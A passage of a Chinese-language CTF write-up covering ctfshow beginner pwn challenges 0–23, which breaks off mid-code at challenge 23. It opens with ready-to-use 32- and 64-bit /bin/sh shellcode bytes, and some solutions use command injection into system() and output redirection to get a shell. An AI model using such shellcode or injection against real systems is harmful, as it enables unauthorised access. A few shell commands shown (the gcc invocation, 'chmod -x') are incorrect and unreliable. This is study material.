---
title: "pwn"
lastmod: 2026-06-15T15:46:23+08:00
draft: false
---
# pwn

32位最短的shellcode为21字节，内容是
```
\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80
```
64位最短的shellcode为22字节，内容是
```
\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05
```
## 0

下载finalshell

打开以后点击第一个文件夹

![1760442276711-53512bb1-c6fb-46b3-9a24-3493d6a7967c.png](./img/I9qdj-CFnaq3QouQ/1760442276711-53512bb1-c6fb-46b3-9a24-3493d6a7967c-439502.png)

就可以连接

![1760442296365-387f6dc3-76f9-49cc-b7df-f66d77a20e19.png](./img/I9qdj-CFnaq3QouQ/1760442296365-387f6dc3-76f9-49cc-b7df-f66d77a20e19-937571.png)

出来一个这样的界面

不知道为什么不能输入delete

直接输入shell命令在系统里面找就行了

在根目录下，直接tac输出就行了

![1760442449274-16f226cc-353a-4af8-b673-6fa72a37309d.png](./img/I9qdj-CFnaq3QouQ/1760442449274-16f226cc-353a-4af8-b673-6fa72a37309d-826381.png)

## 1

看见一个文件，下载下来

不知道是啥，进IDA分析一下

![1760490695075-009308de-24ce-4649-b11e-44f9c59dc068.png](./img/I9qdj-CFnaq3QouQ/1760490695075-009308de-24ce-4649-b11e-44f9c59dc068-427272.png)

这种不要思考，选默认

打开以后按F5就能看出来这个程序在干什么

![1760491936520-dd886929-d058-4bc1-8b88-27fb0f5020c0.png](./img/I9qdj-CFnaq3QouQ/1760491936520-dd886929-d058-4bc1-8b88-27fb0f5020c0-760241.png)

看的出来，直接将flag输出来

所以直接ncat找当前服务器下的输出端口监听即可。

## 2

把pwn文件下载下来

反编译一下看一下是什么东西

```cpp
int __cdecl main(int argc, const char **argv, const char **envp)
{
  setvbuf(_bss_start, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 2, 0LL);
  logo();
  puts(" Now, you can use 'cat /ctfshow_flag' to get flag! ");
  system("/bin/sh");
  return 0;
}
```

*好吧，看不懂。。。*

使用nc连接

*记得格式和正常的nc命令不一样，要输入ncat -t -C(C要大写)*

使用linux虚拟机自带的命令，windows的命令不可信

直接ls，tac输出就行了

## 3

下载文件，反编译一下看眼代码

```cpp
int __cdecl main(int argc, const char **argv, const char **envp)
{
  const char **v3; // rdx
  char argva[12]; // [rsp+4h] [rbp-Ch] BYREF

  *(_QWORD *)&argva[4] = __readfsqword(0x28u);
  setvbuf(_bss_start, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 2, 0LL);
  logo();
  puts("[*] level up ! Let's go ! ");
  menu();
  puts("Your choice is :\n");
  __isoc99_scanf("%d", argva);
  switch ( *(_DWORD *)argva )
  {
    case 1:
      puts("start");
      break;
    case 2:
      main((int)"%d", (const char **)argva, v3);
      break;
    case 3:
      printf("Hello CTFshow");
      break;
    case 4:
      ctfshow();
      break;
    case 5:
      printf("/ctfshow_flag");
      break;
    case 6:
      system_func();
      break;
    case 7:
      puts("/ctfshow_flag");
      break;
    case 8:
      exit(0);
    default:
      puts("Invalid input");
      break;
  }
  return 0;
}
```

发现其中的case 6有情况，双击看眼什么情况

```cpp
int system_func()
{
  return system("cat /ctfshow_flag");
}
```

直接输出了结果

那么就可以直接运行了

## 4

```cpp
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s1[11]; // [rsp+1h] [rbp-1Fh] BYREF
  char s2[12]; // [rsp+Ch] [rbp-14h] BYREF
  unsigned __int64 v6; // [rsp+18h] [rbp-8h]

  v6 = __readfsqword(0x28u);//检测栈溢出
  setvbuf(_bss_start, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 2, 0LL);
  strcpy(s1, "CTFshowPWN");//设置s1
  logo();//输出标志
  puts("find the secret !");
  __isoc99_scanf("%s", s2);//输入s2
  if ( !strcmp(s1, s2) )//对比两个字符，如果是相等的就会执行
    execve_func();
  return 0;
}
```

```cpp
unsigned __int64 execve_func()
{
  char *argv[3]; // [rsp+0h] [rbp-20h] BYREF
  unsigned __int64 v2; // [rsp+18h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  argv[0] = "/bin/sh";
  argv[1] = 0LL;
  argv[2] = 0LL;
  execve("/bin/sh", argv, 0LL);//设置成shell交互命令
  return __readfsqword(0x28u) ^ v2;
}
```

### setvbuf

#### <font style="color:rgb(0, 0, 0);">场景 1：关闭标准输出缓冲（常用于实时输出）</font>

运行

```c
// 反编译代码
setvbuf(stdout, 0LL, 2, 0LL);  // 2 对应 _IONBF（无缓冲）
```

* 对应 C 逻辑：`setvbuf(stdout, NULL, _IONBF, 0);`
* 作用：关闭 `stdout` 的缓冲区，确保 `printf`、`puts` 等输出函数的内容**立即显示**（不等待缓冲区满或换行）。常见于需要实时输出的场景（如交互程序、日志打印）。

#### <font style="color:rgb(0, 0, 0);">场景 2：设置行缓冲（终端默认行为）</font>

运行

```c
// 反编译代码
setvbuf(stdin, buf, 1, 0x20);  // 1 对应 _IOLBF（行缓冲）
```

* 对应 C 逻辑：`setvbuf(stdin, buf, _IOLBF, 32);`
* 作用：为标准输入 `stdin` 设置行缓冲，使用自定义缓冲区 `buf`（大小 32 字节），遇到换行符时刷新缓冲。

#### <font style="color:rgb(0, 0, 0);">场景 3：设置文件全缓冲（提升文件读写效率）</font>

运行

```c
// 反编译代码
FILE *v1 = fopen("data.txt", "w");
setvbuf(v1, 0LL, 0, 0x1000);  // 0 对应 _IOFBF（全缓冲）
```

# 前置基础

## 5

有两个文件，先下载下来

反编译一下

```cpp
void __noreturn start()
{
  int v0; // et1
  int v1; // et1
  int v2; // et1
  int v3; // eax
  int v4; // eax

  v0 = *(&dword_80490E8 + 1);
  v1 = *(&dword_80490E8 + 1);
  v2 = *(&dword_80490E8 + 1);
  v3 = sys_write(1, &dword_80490E8, 0x16u);
  v4 = sys_exit(0);
}
```

asm是汇编语言，可以直接打开

```cpp
section .data
    msg db "Welcome_to_CTFshow_PWN", 0

section .text
    global _start

_start:

; 立即寻址方式
    mov eax, 11         ; 将11赋值给eax
    add eax, 114504     ; eax加上114504
    sub eax, 1          ; eax减去1

; 寄存器寻址方式
    mov ebx, 0x36d      ; 将0x36d赋值给ebx
    mov edx, ebx        ; 将ebx的值赋值给edx

; 直接寻址方式
    mov ecx, msg      ; 将msg的地址赋值给ecx

; 寄存器间接寻址方式
    mov esi, msg        ; 将msg的地址赋值给esi
    mov eax, [esi]      ; 将esi所指向的地址的值赋值给eax

; 寄存器相对寻址方式
    mov ecx, msg        ; 将msg的地址赋值给ecx
    add ecx, 4          ; 将ecx加上4
    mov eax, [ecx]      ; 将ecx所指向的地址的值赋值给eax

; 基址变址寻址方式
    mov ecx, msg        ; 将msg的地址赋值给ecx
    mov edx, 2          ; 将2赋值给edx
    mov eax, [ecx + edx*2]  ; 将ecx+edx*2所指向的地址的值赋值给eax

; 相对基址变址寻址方式
    mov ecx, msg        ; 将msg的地址赋值给ecx
    mov edx, 1          ; 将1赋值给edx
    add ecx, 8          ; 将ecx加上8
    mov eax, [ecx + edx*2 - 6]  ; 将ecx+edx*2-6所指向的地址的值赋值给eax

; 输出字符串
    mov eax, 4          ; 系统调用号4代表输出字符串
    mov ebx, 1          ; 文件描述符1代表标准输出
    mov ecx, msg        ; 要输出的字符串的地址
    mov edx, 22         ; 要输出的字符串的长度
    int 0x80            ; 调用系统调用

; 退出程序
    mov eax, 1          ; 系统调用号1代表退出程序
    xor ebx, ebx        ; 返回值为0
    int 0x80            ; 调用系统调用

```

问题来了，好像看不出来是什么东西

算了，直接运行![1760663159941-c2113c9a-7a80-4fbc-80fc-c0a80b7b4d89.png](./img/I9qdj-CFnaq3QouQ/1760663159941-c2113c9a-7a80-4fbc-80fc-c0a80b7b4d89-012415.png)

可以从IDA中找出输出的东西在哪里

源代码中现实的是 <code>v3 = sys_write(1, &dword_80490E8, 0x16u);</code>

是从80490E8的位置调取0x16u个字节，即0x16个，即22个

所以数出22个字节就可以了

## 6

看眼问题

<font style="color:rgb(33, 37, 41);">立即寻址方式结束后eax寄存器的值为？</font>

然后看眼文件，发现和上一道题目一眼

看直接寻址部分，找到

```cpp
; 立即寻址方式
    mov eax, 11         ; 将11赋值给eax
    add eax, 114504     ; eax加上114504
    sub eax, 1          ; eax减去1
```

他后面注释都给了，直接114514 *好臭的题解*

## 7

题目：

<font style="color:rgb(33, 37, 41);">寄存器寻址方式结束后edx寄存器的值为？</font>

```cpp
; 寄存器寻址方式
    mov ebx, 0x36d      ; 将0x36d赋值给ebx
    mov edx, ebx        ; 将ebx的值赋值给edx
```

0x36D

## 8

<font style="color:rgb(33, 37, 41);">直接寻址方式结束后ecx寄存器的值为？</font>

```cpp
section .data
    msg db "Welcome_to_CTFshow_PWN", 0

section .text
    global _start

_start:

; 立即寻址方式
    mov eax, 11         ; 将11赋值给eax
    add eax, 114504     ; eax加上114504
    sub eax, 1          ; eax减去1

; 寄存器寻址方式
    mov ebx, 0x36d      ; 将0x36d赋值给ebx
    mov edx, ebx        ; 将ebx的值赋值给edx

; 直接寻址方式
    mov ecx, [msg]      ; 将msg的地址赋值给ecx
```

注意其中msg加了一个\[]就是代表地址的意思

问题来了，msg是什么

把系统代码丢进ida看一下

```cpp
mov     ecx, dword_80490E8
```

这一行就是代码相应的赋值

至于dword\_80490E8是什么，双击一下

![1760680777391-eecf3a52-e9be-408a-802a-f868393499c0.png](./img/I9qdj-CFnaq3QouQ/1760680777391-eecf3a52-e9be-408a-802a-f868393499c0-195531.png)

这个080490E8就是msg的地址

*mov代表的是将第一个变量赋值为第二个变量， 正常情况下变量储存的是地址，所以填入两个变量的话就会赋值为第二个变量的地址*

*<font style="color:rgba(0, 0, 0, 0.85);">不加 </font>*<code>_<font style="color:rgba(0, 0, 0, 0.85);">[]</font>_</code>*<font style="color:rgba(0, 0, 0, 0.85);">：操作的是 “立即数” 或 “寄存器的值”</font>*

*<font style="color:rgba(0, 0, 0, 0.85);">此时参数表示的是一个 “直接值”（立即数）或 “寄存器中存储的数值”，</font>*<code>_<font style="color:rgba(0, 0, 0, 0.85);">mov</font>_</code>*<font style="color:rgba(0, 0, 0, 0.85);"> 指令会将这个值直接传送到目标位置。</font>*

*<font style="color:rgba(0, 0, 0, 0.85);">加 </font>*<code>_<font style="color:rgba(0, 0, 0, 0.85);">[]</font>_</code>*<font style="color:rgba(0, 0, 0, 0.85);">：操作的是 “内存地址中的值”</font>*

*<font style="color:rgba(0, 0, 0, 0.85);">此时参数表示的是一个 “内存地址”，</font>*<code>_<font style="color:rgba(0, 0, 0, 0.85);">mov</font>_</code>*<font style="color:rgba(0, 0, 0, 0.85);"> 指令会先解析这个地址，再将该地址对应的内存单元中存储的数据传送到目标位置（可以理解为 “间接访问内存”）。</font>*

*<font style="color:rgba(0, 0, 0, 0.85);">加上\[]相当于c语言的\*调用</font>*

**.data:080490E8**：表示当前数据所在的**段名**（.data）和**内存地址**（080490E8）。这里的地址是程序加载到内存后的虚拟地址（32 位程序，地址以 0804 开头是典型的 ELF 文件加载基址）。

**dword\_80490E8**：反汇编工具自动生成的**符号名**（变量名）。由于原始二进制中可能没有保留变量名，工具会根据数据类型（如双字 dword）和地址自动命名（如`dword_地址`）。

**dd 636C6557h**：表示**数据定义指令**和**具体数值**。`dd` 是指令，`636C6557h` 是数据值（十六进制）。

**org 80490E8h**：`org` 是 “origin” 的缩写，意为 “起始地址”，用于指定后续数据在内存中的起始偏移地址。这里表示从地址 `080490E8h` 开始存放后续数据（不过此行被注释掉了，可能是工具自动生成的提示）。

**dd 636C6557h**：`dd` 是 “define double word” 的缩写，意为 “定义双字（4 字节）数据”。后面的 `636C6557h` 是具体的 4 字节值，按小端序（x86 架构默认）解析为 ASCII 字符：

* 0x57 → 'W'，0x65 → 'e'，0x6C → 'l'，0x63 → 'c'合起来是 "Welc"（推测是 "Welcome" 的前 4 个字符）。

**db 'ome\_to\_CTFshow\_PWN',0**：`db` 是 “define byte” 的缩写，意为 “定义字节数据”。这里用于存储字符串：

* `'ome_to_CTFshow_PWN'` 是字符串内容（接上前面的 "Welc" 就是完整的 "Welcome\_to\_CTFshow\_PWN"），
* 末尾的 `0` 是 C 语言风格的字符串结束符（NULL 终止符）。

## *9*

<font style="color:rgb(33, 37, 41);">寄存器间接寻址方式结束后eax寄存器的值为？</font>

```cpp
; 寄存器间接寻址方式
    mov esi, msg        ; 将msg的地址赋值给esi
    mov eax, [esi]      ; 将esi所指向的地址的值赋值给eax
```

<font style="color:rgb(77, 77, 77);">mov esi,msg本条代码是将msg的地址赋值给esi，此时esi寄存器的值也就是上道题目的080490E8。</font>\ <font style="color:rgb(77, 77, 77);">mov eax,\[esi]本条代码是将esi中的值作为地址，然后将该地址单元的值赋给eax</font>

<font style="color:rgba(0, 0, 0, 0.85);background-color:#FFFFFF;">所以这道题目就是直接打开</font><font style="color:rgb(77, 77, 77);">080490E8这个地址的值</font>

![1760871116684-df148ced-ad22-41ef-8f39-aadff5a5c57d.png](./img/I9qdj-CFnaq3QouQ/1760871116684-df148ced-ad22-41ef-8f39-aadff5a5c57d-902884.png)

可以看出就是636C6557这个值

末尾的h表示16进制，不用去理他

## 10

<font style="color:rgb(33, 37, 41);">寄存器相对寻址方式结束后eax寄存器的值为？</font>

```cpp
; 寄存器相对寻址方式
    mov ecx, msg        ; 将msg的地址赋值给ecx
    add ecx, 4          ; 将ecx加上4
    mov eax, [ecx]      ; 将ecx所指向的地址的值赋值给eax
```

第一步之后ecx的地址是<font style="color:rgb(77, 77, 77);">080490E8</font>

<font style="color:rgb(77, 77, 77);">所以就是加上4，080490EC</font>

<font style="color:rgb(77, 77, 77);">直接找这个地址就行</font>

![1760871331023-a20831db-ceb2-4c8c-a9d6-dfff6b7346ea.png](./img/I9qdj-CFnaq3QouQ/1760871331023-a20831db-ceb2-4c8c-a9d6-dfff6b7346ea-857767.png)

得出结果，<font style="color:rgb(77, 77, 77);">ome\_to\_CTFshow\_PWN</font>

## <font style="color:rgb(77, 77, 77);">11</font>

<font style="color:rgb(33, 37, 41);">基址变址寻址方式结束后的eax寄存器的值为？</font>

```cpp
; 基址变址寻址方式
    mov ecx, msg        ; 将msg的地址赋值给ecx
    mov edx, 2          ; 将2赋值给edx
    mov eax, [ecx + edx*2]  ; 将ecx+edx*2所指向的地址的值赋值给eax
```

就是msg的地址加上4指向的值

答案和上一道题目没有区别

## 12

<font style="color:rgb(33, 37, 41);">相对基址变址寻址方式结束后eax寄存器的值为？</font>

```cpp
; 相对基址变址寻址方式
    mov ecx, msg        ; 将msg的地址赋值给ecx
    mov edx, 1          ; 将1赋值给edx
    add ecx, 8          ; 将ecx加上8
    mov eax, [ecx + edx*2 - 6]  ; 将ecx+edx*2-6所指向的地址的值赋值给eax
```

直接计算一下算式就可以看出来是msg+8+2-6

和上一道题目的答案还是没有区别。。。

## 13

<font style="color:rgb(33, 37, 41);">如何使用GCC？编译运行后即可获得flag</font>

<font style="color:rgb(33, 37, 41);">给了一个文件，是.c文件</font>

*<font style="color:rgb(33, 37, 41);">不是你认真的？</font>*

```cpp
#include <stdio.h>
int main() {
    char flag[] = {99, 116, 102, 115, 104, 111, 119, 123, 104, 79, 119, 95, 116, 48, 95, 117, 115, 51, 95, 71, 67, 67, 63, 125, 0};
    printf("%s", flag);
    return 0;
}

```

在linux里面直接命令解决就是了

```cpp
gcc -o flag -flag.c//编译出可以运行的文件
./flag//运行编译后的文件
```

注意Linux中运行编译后的程序要地址

![1760872410730-31e4f95e-eff4-4ff6-b38e-b426472cf49f.png](./img/I9qdj-CFnaq3QouQ/1760872410730-31e4f95e-eff4-4ff6-b38e-b426472cf49f-774798.png)

## 14

<font style="color:rgb(33, 37, 41);">请你阅读以下源码，给定key为”CTFshow”，编译运行即可获得flag</font>

<font style="color:rgb(33, 37, 41);">看眼源码</font>

```cpp
#include <stdio.h>
#include <stdlib.h>

#define BUFFER_SIZE 1024

int main() {
    FILE *fp;
    unsigned char buffer[BUFFER_SIZE];
    size_t n;
    fp = fopen("key", "rb");
    if (fp == NULL) {
        perror("Nothing here!");
        return -1;
    }
    char output[BUFFER_SIZE * 9 + 12]; 
    int offset = 0;
    offset += sprintf(output + offset, "ctfshow{");
    while ((n = fread(buffer, sizeof(unsigned char), BUFFER_SIZE, fp)) > 0) {
        for (size_t i = 0; i < n; i++) {
            for (int j = 7; j >= 0; j--) {
                offset += sprintf(output + offset, "%d", (buffer[i] >> j) & 1);
            }
            if (i != n - 1) {
                offset += sprintf(output + offset, "_");
            }
        }
        if (!feof(fp)) {
            offset += sprintf(output + offset, " ");
        }
    }
    offset += sprintf(output + offset, "}");
    printf("%s\n", output);
    fclose(fp);
    return 0;
}

```

中间一大串鬼东西，看起来是生成flag，理都不用理

看题目描述，说明是直接定义key文件为<font style="color:rgb(33, 37, 41);">CTFshow，考的是shell命令</font>

```cpp
echo CTFshow > key
```

可以了，剩下的和上一道题目一样

![1760926974153-aebacae5-d8ec-4fa4-8d54-af791b67df6c.png](./img/I9qdj-CFnaq3QouQ/1760926974153-aebacae5-d8ec-4fa4-8d54-af791b67df6c-612857.png)

## 15

<font style="color:rgb(33, 37, 41);">编译汇编代码到可执行文件，即可拿到flag</font>

<font style="color:rgb(33, 37, 41);">看眼汇编代码</font>

```cpp
section .data
    str1 db "CTFshow",0
    str2 db "_3@sy",0
    str3 db "@ss3mb1y",0
    str4 db "_1s",0
    str5 db "ctfshow{"
    str6 db "}"

section .text
    global _start

_start:
    mov eax, 4 
    mov ebx, 1 
    mov ecx, str5 
    mov edx, 8
    int 0x80 

    mov eax, 4
    mov ebx, 1
    mov ecx, str3
    mov edx, 8
    int 0x80

    mov eax, 4
    mov ebx, 1
    mov ecx, str4
    mov edx, 3
    int 0x80

    mov eax, 4
    mov ebx, 1
    mov ecx, str2
    mov edx, 5
    int 0x80

    mov eax, 4
    mov ebx, 1
    mov ecx, str6
    mov edx, 1
    int 0x80

    mov eax, 1 
    xor ebx, ebx 
    int 0x80 

```

好像不是很需要思考，直接编译运行就行，考的还是shell

```cpp
nasm -f elf64 flag.asm # 将flag.asm编译成64为.o文件
ld -s -o flag flag.o # 将flag.o链接成flag可执行文件
./flag # 运行flag可执行文件拿到flag
```

![1760927233886-f3f649d1-60b3-473f-87bc-28f1e8b2173a.png](./img/I9qdj-CFnaq3QouQ/1760927233886-f3f649d1-60b3-473f-87bc-28f1e8b2173a-558090.png)

### <font style="color:rgb(0, 0, 0);">1.</font><font style="color:rgb(0, 0, 0);"> </font>`nasm -f elf64 flag.asm`

* <code>**nasm**</code>：是一款流行的汇编器（Netwide Assembler），用于将汇编语言代码转换为机器码（目标文件）。
* <code>**-f elf64**</code>：指定输出的目标文件格式为 `elf64`（64 位的 Executable and Linkable Format），这是 Linux 系统中常用的目标文件格式，适用于 64 位架构。
* <code>**flag.asm**</code>：输入的汇编源代码文件，包含需要执行的汇编指令。

**作用**：将 `flag.asm` 中的汇编代码编译（汇编）成 64 位的目标文件 `flag.o`（默认与源文件同名，后缀为 `.o`）。目标文件包含机器码，但尚未完成地址关联（如函数调用、变量引用的地址尚未最终确定），无法直接执行。

### <font style="color:rgb(0, 0, 0);">2.</font><font style="color:rgb(0, 0, 0);"> </font>`ld -s -o flag flag.o`

* <code>**ld**</code>：是 GNU 链接器（Linker），用于将一个或多个目标文件（`.o`）以及库文件链接成最终的可执行文件。
* <code>**-s**</code>：可选参数，作用是 “剥离”（strip）可执行文件中的符号表（如函数名、变量名等调试信息），减小文件体积，同时让可执行文件更难被逆向分析。
* <code>**-o flag**</code>：指定输出的可执行文件名为 `flag`（`-o` 后接输出文件名）。
* <code>**flag.o**</code>：输入的目标文件，即第一步生成的 `flag.o`。

**作用**<font style="color:rgba(0, 0, 0, 0.85);">：将 </font><code><font style="color:rgba(0, 0, 0, 0.85);">flag.o</font></code><font style="color:rgba(0, 0, 0, 0.85);"> 目标文件链接成一个完整的、可直接运行的 64 位可执行文件 </font><code><font style="color:rgba(0, 0, 0, 0.85);">flag</font></code><font style="color:rgba(0, 0, 0, 0.85);">。链接过程会解决目标文件中未确定的地址引用（如将函数调用绑定到实际内存地址），最终生成操作系统可加载执行的文件。</font>

## <font style="color:rgba(0, 0, 0, 0.85);">16</font>

<font style="color:rgb(33, 37, 41);">使用gcc将其编译为可执行文件</font>

<font style="color:rgb(33, 37, 41);">给了一个.s文件，就是考你编译运行的能力</font>

<font style="color:rgb(33, 37, 41);">源代码看不懂，但是不重要</font>

<font style="color:rgb(33, 37, 41);">和c语言一样用gcc编译器就行</font>

![1760927480478-e61362b0-56d4-43ee-b182-99f2603e175b.png](./img/I9qdj-CFnaq3QouQ/1760927480478-e61362b0-56d4-43ee-b182-99f2603e175b-846353.png)

## 17

<font style="color:rgb(33, 37, 41);">有些命令好像有点不一样？</font>

<font style="color:rgb(33, 37, 41);">不要一直等，可能那样永远也等不到flag</font>

<font style="color:rgb(33, 37, 41);">给了一个文件，一个nc连接链接</font>

<font style="color:rgb(33, 37, 41);">先看眼给的pwn文件是什么东西，首先是64位，然后反编译一下看看</font>

```cpp
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [rsp+4h] [rbp-1Ch] BYREF
  char dest[4]; // [rsp+Ah] [rbp-16h] BYREF
  char buf[10]; // [rsp+Eh] [rbp-12h] BYREF
  unsigned __int64 v7; // [rsp+18h] [rbp-8h]

  v7 = __readfsqword(0x28u);
  setvbuf(_bss_start, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 1, 0LL);
  puts(asc_D48);
  puts(asc_DC0);
  puts(asc_E40);
  puts(asc_ED0);
  puts(asc_F60);
  puts(asc_FE8);
  puts(asc_1080);
  puts("    * *************************************                           ");
  puts(aClassifyCtfsho);
  puts("    * Type  : Linux_Security_Mechanisms                               ");
  puts("    * Site  : https://ctf.show/                                       ");
  puts("    * Hint  : You should understand the basic command usage of Linux! ");
  puts("    * *************************************                           ");
  *(_DWORD *)dest = 790655852;
  v4 = 0;
  puts("\nHow much do you know about Linux commands? \n");
  while ( 1 )
  {
    menu();
    v4 = 0;
    puts("\nEnter the command you want choose:(1.2.3.4 or 5)\n");
    __isoc99_scanf("%d", &v4);
    switch ( v4 )
    {
      case 1:
        system("id");
        break;
      case 2:
        puts("Which directory?('/','./' or the directiry you want?)");
        read(0, buf, 0xAuLL);
        strcat(dest, buf);
        system(dest);
        puts("Execution succeeded!");
        break;
      case 3:
        sleep(1u);
        puts("$cat /ctfshow_flag");
        sleep(1u);
        puts("ctfshow{");
        sleep(2u);
        puts("... ...");
        sleep(3u);
        puts("Your flag is ...");
        sleep(5u);
        puts("ctfshow{flag is not here!}");
        sleep(0x14u);
        puts("wtf?You haven't left yet?\nOk~ give you flag:\nflag is loading......");
        sleep(0x1BF52u);
        system("cat /ctfshow_flag");
        break;
      case 4:
        sleep(2u);
        puts("su: Authentication failure");
        break;
      case 5:
        puts("See you!");
        exit(-1);
      default:
        puts("command not found!");
        break;
    }
  }
}
```

就是一个switch语句

问题来了，3的等待时间114514秒太久了，等不了

再找找有什么system命令可以用

想到/bin/sh可以交互式shell

可以读取是可以读取，但是长度限制为9，所以使用/bin/sh而不是直接输出

![1760929799299-801ffb9b-e4c9-45dc-a4bf-e6a40001eb07.png](./img/I9qdj-CFnaq3QouQ/1760929799299-801ffb9b-e4c9-45dc-a4bf-e6a40001eb07-133865.png)

## 18

直接反编译源代码

```cpp
// main
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v5; // [rsp+8h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  setvbuf(_bss_start, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 1, 0LL);
  puts(s);
  puts(asc_B10);
  puts(asc_B90);
  puts(asc_C20);
  puts(asc_CB0);
  puts(asc_D38);
  puts(asc_DD0);
  puts("    * *************************************                           ");
  puts(aClassifyCtfsho);
  puts("    * Type  : Linux_Security_Mechanisms                               ");
  puts("    * Site  : https://ctf.show/                                       ");
  puts("    * Hint  : Do you know redirect output ?                           ");
  puts("    * *************************************                           ");
  puts("Which is the real flag?");
  __isoc99_scanf("%d", &v4);
  if ( v4 == 9 )
    fake();
  else
    real();
  system("cat /ctfshow_flag");
  return 0;
}

```

```cpp
// fake
int fake()
{
  return system("echo 'flag is here'>>/ctfshow_flag");
}

```

```cpp
// real
int real()
{
  return system("echo 'flag is here'>/ctfshow_flag");
}

```

可以直接看出来fake里面是两个>号，所以就是再文档后面输入

所以直接输入9就是了

## 19

<font style="color:rgb(33, 37, 41);">关闭了输出流，一定是最安全的吗？</font>

```cpp
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char buf[40]; // [rsp+10h] [rbp-30h] BYREF
  unsigned __int64 v5; // [rsp+38h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  setvbuf(_bss_start, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 1, 0LL);
  puts(s);
  puts(asc_BF0);
  puts(asc_C70);
  puts(asc_D00);
  puts(asc_D90);
  puts(asc_E18);
  puts(asc_EB0);
  puts("    * *************************************                           ");
  puts(aClassifyCtfsho);
  puts("    * Type  : Linux_Security_Mechanisms                               ");
  puts("    * Site  : https://ctf.show/                                       ");
  puts("    * Hint  : Turn off output, how to get flag? ");
  puts("    * *************************************                           ");
  if ( fork() )
  {
    wait(0LL);
    sleep(3u);
    printf("flag is not here!");
  }
  else
  {
    puts("give you a shell! now you need to get flag!");
    fclose(_bss_start);
    read(0, buf, 0x20uLL);
    system(buf);
  }
  return 0;
}
```

可以看出来直接关闭了输出流，但是发现执行了system命令，所以可以再打开。。

在shell命令后加`>&0`代表输出到控制台

![1760933693059-95f2d501-ada4-411a-ab1b-e45783413910.png](./img/I9qdj-CFnaq3QouQ/1760933693059-95f2d501-ada4-411a-ab1b-e45783413910-110951.png)

## 20

先理解什么是PLT，什么GOT，即在编程的时候调用函数，在实际运行的时候转到调用相应库的方法。

在实际Linux运行中，习惯将所有东西拖到最后，直到不能再拖才进行运算。

这种有个好处，避免多次运算和多次调用。

在使用GOT表格的时候，程序运行开始的时候并不进行重定向，但是在后面要求使用的时候才进行重定义，这就需要判断GOT表重定向过。

linux链接器使用了嵌套定向的形式，在第一次调用的时候会进行两次调用，在之后的调用中可以定义直接调用

```cpp
void printf@plt()
{
address_good:
    jmp *printf@got            // 链接器将printf@got填成下一语句lookup_printf的地址

lookup_printf:
        调用重定位函数查找printf地址，并写到printf@got

        goto address_good;
}
```

<font style="color:rgb(77, 77, 77);">最后所有plt都跳转到common@plt中执行，这是动态链接做符号解析和重定位的公共入口，GOT也是同理。</font>

<font style="color:rgb(77, 77, 77);">好了，回到题目</font>

*<font style="color:rgb(33, 37, 41);">提交ctfshow{【.got表与.got.plt是否可写(可写为1，不可写为0)】,【.got的地址】,【.got.plt的地址】}</font>*

*<font style="color:rgb(33, 37, 41);">例如 .got可写.got.plt表可写其地址为0x400820 0x8208820</font>*

*<font style="color:rgb(33, 37, 41);">最终flag为ctfshow{1\_1\_0x400820\_0x8208820}</font>*

*<font style="color:rgb(33, 37, 41);">若某个表不存在，则无需写其对应地址</font>*

*<font style="color:rgb(33, 37, 41);">如不存在.got.plt表，则最终flag值为ctfshow{1\_0\_0x400820}</font>*

<font style="color:rgb(33, 37, 41);">记得加上chmod -x pwn（给pwn执行权限）</font>

![1761094393908-058858dc-5523-47d7-86dd-751a217cc128.png](./img/I9qdj-CFnaq3QouQ/1761094393908-058858dc-5523-47d7-86dd-751a217cc128-676195.png)

看眼这个pwn文件，其中的RELRO显示的是NO

说明plt和got表不能修改

Partial RELRO：一些段（包括.dynamic、.got等）在初始化后将会被标记为只读。在Ubuntu16.04（GCC-5.4.0）上默认开启Partial RELRO。

Full RELRO：除了Partial RELRO，延迟绑定将被禁止，所有的导入符号将在开始时被解析，.gotPlt段会被完全初始化为目标函数的最终地址，并被mprotect标记为只读但其实.got.plt会直接被合并到.got，也就看不到这段了。另外link\_map和\_dl\_runtime\_resolve的地址也不会被装入。开启Full RELRO会对程序启动时的性能造成一定的影响，但也只有这样才能防止攻击者篡改GOT。

当RELRO为Partial RELRO时，表示.got不可写而.got.plt可写。

当RELRO为FullRELRO时，表示.got不可写.got.plt也不可写。

当RELRO为No RELRO时，表示.got与.got.plt都可写。

之后就是查找地址`readelf -S pwn`

![1761095767941-1e18e385-4f03-41c5-8582-7f4323151da5.png](./img/I9qdj-CFnaq3QouQ/1761095767941-1e18e385-4f03-41c5-8582-7f4323151da5-108369.png)

## 21

题面同上

![1761096363893-048d0808-2872-42dc-ae11-b1a859a12918.png](./img/I9qdj-CFnaq3QouQ/1761096363893-048d0808-2872-42dc-ae11-b1a859a12918-797459.png)

![1761096378802-719a7c6f-5c32-4017-95d1-44412b88b26c.png](./img/I9qdj-CFnaq3QouQ/1761096378802-719a7c6f-5c32-4017-95d1-44412b88b26c-526358.png)

解法同上

## 22

题面同上

![1761096485176-d694c711-ddf7-473f-bb7b-e1a10355801f.png](./img/I9qdj-CFnaq3QouQ/1761096485176-d694c711-ddf7-473f-bb7b-e1a10355801f-099082.png)

![1761096511769-f27ceefc-ce77-4a2d-8684-f242bad9c1ed.png](./img/I9qdj-CFnaq3QouQ/1761096511769-f27ceefc-ce77-4a2d-8684-f242bad9c1ed-787028.png)

解法同上

## 23

直接反编译一下，看见原函数

```bash
int __cdecl main(int argc, const char **argv, const char **envp)
{
  __gid_t v3; // eax
  int v5; // [esp-Ch] [ebp-2Ch]
  int v6; // [esp-8h] [ebp-28h]
  int v7; // [esp-4h] [ebp-24h]
  FILE *stream; // [esp+4h] [ebp-1Ch]

